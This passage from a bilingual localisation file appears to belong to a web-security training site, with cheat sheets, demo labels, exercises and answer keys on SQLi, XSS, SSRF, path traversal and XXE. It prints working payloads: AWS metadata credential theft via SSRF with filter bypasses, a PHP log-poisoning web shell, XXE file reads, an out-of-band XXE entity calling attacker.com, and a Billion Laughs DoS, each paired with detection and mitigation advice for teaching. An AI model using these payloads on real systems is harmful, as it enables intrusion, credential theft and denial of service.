      'http.cheat.r2.sig': "URI with ', OR, UNION SELECT",
      'http.cheat.r2.att': "SQL Injection",
      'http.cheat.r2.act': "WAF block, investigate DB",
      'http.cheat.r3.sig': "URI with &lt;script&gt; or %3Cscript%3E",
      'http.cheat.r3.att': "XSS attempt",
      'http.cheat.r3.act': "WAF block, check if stored",
      'http.cheat.r4.sig': "Spike of 500s from one IP",
      'http.cheat.r4.att': "SQLi fuzzing, payload testing",
      'http.cheat.r4.act': "Rate limit, block IP",
      'http.cheat.r5.sig': "Many sequential 404s",
      'http.cheat.r5.att': "Directory brute-force",
      'http.cheat.r5.act': "Rate limit, honeypot paths",
      'http.cheat.r6.sig': "GET /api/resource?id=1,2,3...",
      'http.cheat.r6.att': "IDOR enumeration",
      'http.cheat.r6.act': "Verify auth checks, patch",
      'http.cheat.r7.sig': "Content-Type: octet-stream from unknown IP",
      'http.cheat.r7.att': "Malware download / C2",
      'http.cheat.r7.act': "Block, analyze file hash",
      'http.cheat.r8.sig': "HTTP (not HTTPS) with session cookie",
      'http.cheat.r8.att': "Session hijack risk",
      'http.cheat.r8.act': "Enforce HTTPS, add Secure flag",
    'http.demo.waiting2': "Configure the flags and analyze...",
    'http.cheat.r1a': "UNION/SELECT in URI or body",
    'http.cheat.r1c': "Block IP, review DB, WAF rule",
    'http.cheat.r2a': "%2e%2e or ../ in query params",
    'http.cheat.r2c': "Block, audit accessed files",
    'http.cheat.r3a': "DOCTYPE / SYSTEM in XML body",
    'http.cheat.r3c': "Disable DTD in parser, SIEM alert",
    'http.cheat.r4a': "Outbound request to 169.254.x.x from app",
    'http.cheat.r4c': "Alert immediately, review CloudTrail",
    'http.cheat.r5a': "Spike of 403/404 on /admin, /.env",
    'http.cheat.r5b': "Reconnaissance / fuzzing",
    'http.cheat.r5c': "Rate limit, block IP range, review UA",
    'http.cheat.r6a': "&lt;script&gt; in GET/POST parameters",
    'http.cheat.r6c': "WAF rule, review CSP headers",
    'http.cheat.r7b': "Automated scanning",
    'http.cheat.r7c': "Block UA, alert SOC",
    'http.demo.waiting': "Choose an action to compare...",
    'http.pre3': { es: `
VECTOR TÍPICO:
  GET /fetch?url=https://example.com/image.jpg HTTP/1.1
  → El servidor hace la petición en nombre del usuario

PAYLOAD SSRF — AWS Metadata:
  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
  Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
  → Credenciales IAM completas → acceso a S3, EC2, RDS

PAYLOAD SSRF — Redis sin auth:
  GET /fetch?url=dict://127.0.0.1:6379/info
  → Dump de configuración Redis → SET commands → RCE

BYPASS DE FILTROS:
  Filtro: bloquea "169.254.169.254"
  Bypass: http://169.254.169.254  → http://0xa9fea9fe → http://2852039166
  Bypass: http://evil.com → DNS resuelve a 169.254.169.254 (DNS rebinding)
  Bypass: http://[::ffff:169.254.169.254] (IPv6)

BLIND SSRF:
  Sin respuesta visible — usar Burp Collaborator o interactsh
  El servidor hace la petición pero no devuelve el resultado
  Detectar via: DNS lookup, TCP connect, timing differences

DETECCIÓN:
  WAF: bloquear IPs RFC1918 y 169.254.x.x en parámetros URL
  Logs: peticiones salientes desde servidores de app a IPs internas
  SIEM: EC2 haciendo requests a 169.254.169.254 sin agente legítimo`, en: `
TYPICAL VECTOR:
  GET /fetch?url=https://example.com/image.jpg HTTP/1.1
  → The server makes the request on behalf of the user

SSRF PAYLOAD — AWS Metadata:
  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
  Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
  → Full IAM credentials → access to S3, EC2, RDS

SSRF PAYLOAD — Redis without auth:
  GET /fetch?url=dict://127.0.0.1:6379/info
  → Redis config dump → SET commands → RCE

FILTER BYPASS:
  Filter: blocks "169.254.169.254"
  Bypass: http://169.254.169.254  → http://0xa9fea9fe → http://2852039166
  Bypass: http://evil.com → DNS resolves to 169.254.169.254 (DNS rebinding)
  Bypass: http://[::ffff:169.254.169.254] (IPv6)

BLIND SSRF:
  No visible response — use Burp Collaborator or interactsh
  The server makes the request but does not return the result
  Detect via: DNS lookup, TCP connect, timing differences

DETECTION:
  WAF: block RFC1918 and 169.254.x.x IPs in URL parameters
  Logs: outbound requests from app servers to internal IPs
  SIEM: EC2 making requests to 169.254.169.254 without a legitimate agent` },
    'http.pre4': { es: `
PAYLOAD BÁSICO:
  GET /download?file=../../../etc/passwd HTTP/1.1
  → root:x:0:0:root:/root:/bin/bash
  → www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

BYPASS DE FILTROS:
  Filtro: reemplaza "../" con ""  →  ....// (nested)
  Filtro: bloquea "/" absoluto    →  ..%2F..%2Fetc%2Fpasswd
  Filtro: valida extensión .php   →  ../../../etc/passwd%00.php (null byte)
  Filtro: reemplaza solo 1 vez    →  ..././..././etc/passwd

ESCALADA A RCE — Log Poisoning:
  1. Inyectar PHP en User-Agent:
     User-Agent: <?php system($_GET['cmd']); ?>
  2. El server guarda el log: /var/log/apache2/access.log
  3. LFI sobre el log:
     GET /page?file=../../../var/log/apache2/access.log&cmd=id
  → uid=33(www-data) gid=33(www-data)  ← RCE conseguido

ARCHIVOS SENSIBLES (Linux):
  /etc/passwd          → usuarios del sistema
  /etc/shadow          → hashes de contraseñas (requiere root)
  /proc/self/environ   → variables de entorno del proceso
  ~/.ssh/id_rsa        → clave privada SSH
  /var/www/html/config.php → credenciales de base de datos

DETECCIÓN:
  WAF: secuencias ../ en parámetros GET/POST
  Logs: accesos a /etc/, /proc/, /var/log/ desde la app web
  SIEM: alerta en GET params con %2e%2e o ../`, en: `
BASIC PAYLOAD:
  GET /download?file=../../../etc/passwd HTTP/1.1
  → root:x:0:0:root:/root:/bin/bash
  → www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

FILTER BYPASS:
  Filter: replaces "../" with ""  →  ....// (nested)
  Filter: blocks absolute "/"     →  ..%2F..%2Fetc%2Fpasswd
  Filter: validates .php extension →  ../../../etc/passwd%00.php (null byte)
  Filter: replaces only once      →  ..././..././etc/passwd

ESCALATION TO RCE — Log Poisoning:
  1. Inject PHP in User-Agent:
     User-Agent: <?php system($_GET['cmd']); ?>
  2. The server writes the log: /var/log/apache2/access.log
  3. LFI over the log:
     GET /page?file=../../../var/log/apache2/access.log&cmd=id
  → uid=33(www-data) gid=33(www-data)  ← RCE achieved

SENSITIVE FILES (Linux):
  /etc/passwd          → system users
  /etc/shadow          → password hashes (requires root)
  /proc/self/environ   → process environment variables
  ~/.ssh/id_rsa        → SSH private key
  /var/www/html/config.php → database credentials

DETECTION:
  WAF: ../ sequences in GET/POST parameters
  Logs: access to /etc/, /proc/, /var/log/ from the web app
  SIEM: alert on GET params with %2e%2e or ../` },
    'http.pre5': { es: `
PAYLOAD XXE — File Read:
  &lt;?xml version="1.0"?&gt;
  &lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
  &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
  Response: root:x:0:0:root:/root:/bin/bash...

PAYLOAD XXE — SSRF:
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/meta-data/"&gt;
  → El servidor accede al metadata de AWS en nombre del atacante

OUT-OF-BAND (Blind XXE):
  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
  %dtd;
  → El servidor contacta attacker.com → confirma la vulnerabilidad
  → evil.dtd puede exfiltrar archivos via DNS o HTTP

BILLION LAUGHS (DoS):
  &lt;!ENTITY a "lol"&gt;
  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
  ... ×10 niveles → 10^10 expansiones → crash del parser

MITIGACIÓN:
  PHP:  libxml_disable_entity_loader(true)
  Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
  Python: defusedxml en lugar de xml.etree
  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit

DETECCIÓN:
  WAF: DOCTYPE, ENTITY, SYSTEM keywords en body XML
  Logs: peticiones salientes inesperadas desde el servidor de app
  SIEM: acceso a file:// o IPs internas desde la capa de aplicación`, en: `
XXE PAYLOAD — File Read:
  &lt;?xml version="1.0"?&gt;
  &lt;!DOCTYPE foo [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
  &lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
  Response: root:x:0:0:root:/root:/bin/bash...

XXE PAYLOAD — SSRF:
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/meta-data/"&gt;
  → The server accesses AWS metadata on behalf of the attacker

OUT-OF-BAND (Blind XXE):
  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
  %dtd;
  → The server contacts attacker.com → confirms the vulnerability
  → evil.dtd can exfiltrate files via DNS or HTTP

BILLION LAUGHS (DoS):
  &lt;!ENTITY a "lol"&gt;
  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
  ... ×10 levels → 10^10 expansions → parser crash

MITIGATION:
  PHP:  libxml_disable_entity_loader(true)
  Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
  Python: defusedxml instead of xml.etree
  .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit

DETECTION:
  WAF: DOCTYPE, ENTITY, SYSTEM keywords in XML body
  Logs: unexpected outbound requests from the app server
  SIEM: access to file:// or internal IPs from the application layer` },
    'http.pre8': { es: `
02:14:01  GET /api/users?id=1  → 200  {"id":1,"email":"admin@corp.com","role":"admin"}
02:14:02  GET /api/users?id=2  → 200  {"id":2,"email":"user2@corp.com","role":"user"}
02:14:03  GET /api/users?id=3  → 200  {"id":3,"email":"user3@corp.com","role":"user"}
...
02:24:09  GET /api/users?id=847 → 200 {"id":847,"email":"user847@corp.com","role":"user"}
User-Agent: python-requests/2.28.0
Authorization: Bearer eyJhbGc...  (token de usuario legítimo #1042)`, en: `
02:14:01  GET /api/users?id=1  → 200  {"id":1,"email":"admin@corp.com","role":"admin"}
02:14:02  GET /api/users?id=2  → 200  {"id":2,"email":"user2@corp.com","role":"user"}
02:14:03  GET /api/users?id=3  → 200  {"id":3,"email":"user3@corp.com","role":"user"}
...
02:24:09  GET /api/users?id=847 → 200 {"id":847,"email":"user847@corp.com","role":"user"}
User-Agent: python-requests/2.28.0
Authorization: Bearer eyJhbGc...  (legitimate user #1042's token)` },
    'http.opt1': "UNION SELECT — data extraction",
    'http.opt2': "Blind SQLi — boolean condition",
    'http.opt3': "DROP TABLE — destructive",
    'http.opt4': "✅ Legitimate input (no injection)",
    'http.opt5': "Internal API (10.0.0.5:8080)",
    'http.opt6': "Redis without auth (127.0.0.1:6379)",
    'http.opt7': "File read (file:///etc/passwd)",
    'http.opt8': "/etc/passwd (system users)",
    'http.opt9': "/etc/shadow (password hashes)",
    'http.opt10': "config.php (DB credentials)",
    'http.opt11': "SSRF via XXE (http://internal/)",
    'http.opt12': "Out-of-band exfiltration",
    'http.demo.ssrf.title': "🌐 Demo: SSRF — Server-Side Request Forgery",
    'http.demo.ssrf.desc':     { es: 'El servidor hace una petición HTTP en nombre del atacante. Permite acceder a recursos internos, metadata cloud, o servicios no expuestos a Internet.', en: 'The server makes an HTTP request on behalf of the attacker. Allows access to internal resources, cloud metadata, or services not exposed to the Internet.' },
    'http.demo.ssrf.panel': "Configure SSRF",
    'http.demo.ssrf.endpoint': "Vulnerable endpoint:",
    'http.demo.ssrf.target': "SSRF target:",
    'http.demo.ssrf.btn': "▶ Execute SSRF",
    'http.demo.ssrf.result': "Server response",
    'http.demo.lfi.title': "📂 Demo: Path Traversal / LFI",
    'http.demo.lfi.desc':      { es: 'Manipulación de rutas de archivo para acceder a archivos fuera del directorio permitido. ../../../etc/passwd es el ejemplo clásico.', en: 'File path manipulation to access files outside the allowed directory. ../../../etc/passwd is the classic example.' },
    'http.demo.lfi.panel': "Configure Path Traversal",
    'http.demo.lfi.param': "Vulnerable parameter:",
    'http.demo.lfi.target': "Target file:",
    'http.demo.lfi.btn': "▶ Execute LFI",
    'http.demo.lfi.result': "File content",
    'http.demo.xxe.title': "📄 Demo: XXE — XML External Entity",
    'http.demo.xxe.desc':      { es: 'Si el servidor parsea XML sin deshabilitar entidades externas, el atacante puede leer archivos, hacer SSRF, o causar DoS (Billion Laughs).', en: 'If the server parses XML without disabling external entities, the attacker can read files, perform SSRF, or cause DoS (Billion Laughs).' },
    'http.demo.xxe.panel': "Configure XXE",
    'http.demo.xxe.type': "XXE attack type:",
    'http.demo.xxe.btn': "▶ Execute XXE",
    'http.demo.xxe.result': "Server response",
    'http.s10.title': "Attack 5: SSRF (Server-Side Request Forgery)",
    'http.s10.sub': "The server makes HTTP requests on behalf of the attacker",
    'http.s10.p1':    { es: 'SSRF ocurre cuando la aplicación acepta una URL del usuario y hace una petición desde el servidor. El atacante apunta a recursos internos no accesibles desde Internet.', en: 'SSRF occurs when the application accepts a URL from the user and makes a request from the server. The attacker targets internal resources not accessible from the Internet.' },
    'http.s11.title': "Attack 6: Path Traversal / LFI",
    'http.s11.sub': "Access files outside the web root directory",
    'http.s11.p1':    { es: 'Path Traversal permite navegar fuera del directorio permitido usando secuencias "../". LFI permite incluir archivos del servidor como código PHP. Ambos pueden escalar a RCE con log poisoning.', en: 'Path Traversal allows navigating outside the allowed directory using "../" sequences. LFI allows including server files as PHP code. Both can escalate to RCE with log poisoning.' },
    'http.s12.title': "Attack 7: XXE — XML External Entity",
    'http.s12.sub': "XML external entities to read files and perform SSRF",
    'http.s12.p1':    { es: 'Si el parser XML del servidor no deshabilita entidades externas, el atacante puede definir entidades que apunten a archivos locales o URLs remotas. El servidor resuelve la entidad e incluye su contenido en la respuesta.', en: 'If the server XML parser does not disable external entities, the attacker can define entities pointing to local files or remote URLs. The server resolves the entity and includes its content in the response.' },
      'http.ej6.title': "SSRF: access AWS instance metadata",
      'http.ej6.q': { es: 'Una aplicación tiene el endpoint /fetch?url= que descarga imágenes remotas. ¿Cómo usarías SSRF para obtener credenciales IAM? ¿Qué URL enviarías? ¿Cómo bypassearías un filtro que bloquea "169.254.169.254"? ¿Qué detectarías en logs?', en: 'An app has a /fetch?url= endpoint that downloads remote images. How would you use SSRF to obtain IAM credentials? What exact URL? How would you bypass a filter blocking "169.254.169.254"? What would you see in the logs?' },
      'http.ej6.ans': { es: 'PAYLOAD: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\nBYPASSES:\n  Decimal: http://2852039166/\n  Hex: http://0xa9fea9fe/\n  IPv6: http://[::ffff:169.254.169.254]/\n  DNS rebind: evil.com → 169.254.169.254 TTL=1s\n\nDETECCIÓN:\n  Petición saliente desde app server a 169.254.x.x\n  CloudTrail: AssumeRole con credenciales EC2 desde IP externa', en: 'PAYLOAD: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\nBYPASSES:\n  Decimal: http://2852039166/\n  Hex: http://0xa9fea9fe/\n  IPv6: http://[::ffff:169.254.169.254]/\n  DNS rebind: evil.com → 169.254.169.254 TTL=1s\n\nDETECTION:\n  Outbound request from app server to 169.254.x.x\n  CloudTrail: AssumeRole with EC2 credentials from external IP' },
      'http.ej7.title': "Path Traversal / LFI: read /etc/passwd",
      'http.ej7.q': { es: 'Una app tiene /download?file=report.pdf. ¿Qué payloads de Path Traversal probarías para leer /etc/passwd? ¿Cómo bypassearías un filtro que remueve "../"? ¿Qué archivos son más valiosos? ¿Cómo detectarías esto en logs?', en: 'An app has /download?file=report.pdf. What Path Traversal payloads would you try to read /etc/passwd? How would you bypass a filter removing "../"? What files are most valuable? How would you detect this in logs?' },
      'http.ej7.ans': { es: 'BÁSICO: /download?file=../../../../etc/passwd\n\nBYPASSES:\n  Double encode: %252e%252e%252f\n  Null byte: ../../../../etc/passwd%00.pdf\n  Strip bypass: ....//....//etc/passwd\n\nARCHIVOS OBJETIVO:\n  /etc/passwd, /proc/self/environ, ~/.ssh/id_rsa\n  /var/www/html/.env, /etc/nginx/nginx.conf\n\nDETECCIÓN:\n  access.log: GET con %2e%2e o \.\./\n  Zeek: uri contains "../" o "%252e"', en: 'BASIC: /download?file=../../../../etc/passwd\n\nBYPASSES:\n  Double encode: %252e%252e%252f\n  Null byte: ../../../../etc/passwd%00.pdf\n  Strip bypass: ....//....//etc/passwd\n\nTARGET FILES:\n  /etc/passwd, /proc/self/environ, ~/.ssh/id_rsa\n  /var/www/html/.env, /etc/nginx/nginx.conf\n\nDETECTION:\n  access.log: GET with %2e%2e or ../\n  Zeek: uri contains "../" or "%252e"' },
      'http.ej8.title': "XXE: extract /etc/hostname via DOCTYPE",
      'http.ej8.q': { es: 'Una API acepta XML en el body. Escribí un payload XXE que lea /etc/hostname. ¿Cómo harías un XXE ciego? ¿Qué parsers son vulnerables por defecto? ¿Cómo mitigas en Java y Python?', en: 'An API accepts XML in the body. Write an XXE payload that reads /etc/hostname. How would you do a blind XXE? Which parsers are vulnerable by default? How do you mitigate in Java and Python?' },
      'http.ej8.ans': { es: 'PAYLOAD XXE:\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n  <root><data>&xxe;</data></root>\n\nBLIND XXE: exfiltrar via DNS/HTTP a servidor del atacante\n\nPARSERS VULNERABLES: Java DocumentBuilderFactory, Python xml.etree\n\nMITIGACIÓN:\n  Java: setFeature("disallow-doctype-decl", true)\n  Python: usar defusedxml en lugar de xml.etree', en: 'XXE PAYLOAD:\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n  <root><data>&xxe;</data></root>\n\nBLIND XXE: exfiltrate via DNS/HTTP to attacker server\n\nVULNERABLE PARSERS: Java DocumentBuilderFactory, Python xml.etree\n\nMITIGATION:\n  Java: setFeature("disallow-doctype-decl", true)\n  Python: use defusedxml instead of xml.etree' },
      'http.rec.otg': "Complete web security testing methodology. Dedicated sections for SQLi, XSS, SSRF, LFI, XXE.",
      'http.rec.portswigger': "Free labs from PortSwigger (Burp Suite creators) for SQLi, XSS, SSRF, Path Traversal, XXE and more.",
      'http.rec.confluence': "OGNL injection in Confluence Server. SSRF + RCE via HTTP parameters. Actively exploited in 2021.",
      'http.rec.phpfpm': "Path traversal in PHP-FPM with Nginx. Allows LFI → RCE in common configurations. CVSS 9.8.",
      'http.rec.struts': { es: 'Doble evaluación OGNL en Apache Struts 2. XXE + RCE a través de parámetros HTTP. Familia que incluye el breach de Equifax.', en: 'Double OGNL evaluation in Apache Struts 2. XXE + RCE via HTTP parameters. Same family as the Equifax breach.' },
      'http.rec.log4shell': { es: 'JNDI injection via headers HTTP. RCE sin autenticación. CVSS 10.0. Afectó millones de servicios Java en 2021.', en: 'JNDI injection via HTTP headers. Unauthenticated RCE. CVSS 10.0. Affected millions of Java services in 2021.' },
      'http.rec.lab.ssrf': "Basic, blind, filter bypass and redirect-based SSRF labs. Free.",
      'http.rec.lab.xxe': "Classic, blind and XInclude XXE labs. Includes SSRF exploitation via XXE.",
      'http.rec.t1190': "Primary technique for exploiting web applications. SQLi, XSS, SSRF, LFI and XXE fall under this technique.",
      'http.rec.t1552': "Cloud instance metadata access via SSRF. Theft of temporary IAM credentials in AWS, Azure and GCP.",
      'http.rec.thm': "TryHackMe room with practical challenges for each OWASP Top 10 vulnerability including XXE and SSRF.",

  // Referenciadas en la pagina de HTTP (cheatsheet) pero definidas en dns por su prefijo
      'dns.cheat.signal': "Signal",
      'dns.cheat.cause': "Possible cause",
      'dns.cheat.action': "Action",
});
